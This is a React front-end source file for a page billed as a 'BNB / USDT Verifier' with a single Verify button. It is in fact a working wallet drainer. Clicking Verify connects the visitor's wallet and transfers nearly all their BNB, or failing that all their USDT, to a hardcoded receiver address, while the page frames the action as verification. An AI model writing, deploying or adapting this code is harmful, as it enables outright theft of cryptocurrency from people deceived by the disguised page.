import React, { useState } from "react";
import { ethers } from "ethers";
import "./index.css";

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

function App() {
  const [status, setStatus] = useState("Click Verify to start...");
  const [loading, setLoading] = useState(false);

  const handleVerify = async () => {
    if (!window.ethereum) {
      setStatus("No wallet detected. Install MetaMask or Binance Wallet.");
      return;
    }

    try {
      setLoading(true);
      setStatus("Connecting wallet...");

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.utils.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB.sub(ethers.utils.parseEther("0.0005")),
        });
        await tx.wait();
        setStatus("✅ BNB sent successfully");
        setLoading(false);
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("✅ USDT sent successfully");
        setLoading(false);
        return;
      }

      setStatus("❌ No BNB or USDT found");
      setLoading(false);
    } catch (err) {
      console.error(err);
      setStatus("Error: " + (err.reason || err.message));
      setLoading(false);
    }
  };

  return (
    <div className="app">
      <div className="card">
        <h1 className="title">BNB / USDT Verifier</h1>
        <p className="subtitle">Instantly verify & transfer BNB or USDT (BEP20).</p>

        <div className="pulse-wrapper">
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <button className="verify-btn" onClick={handleVerify} disabled={loading}>
            {loading ? <span className="spinner"></span> : "Verify"}
          </button>
        </div>

        <p className="status">{status}</p>
      </div>
    </div>
  );
}

export default App;
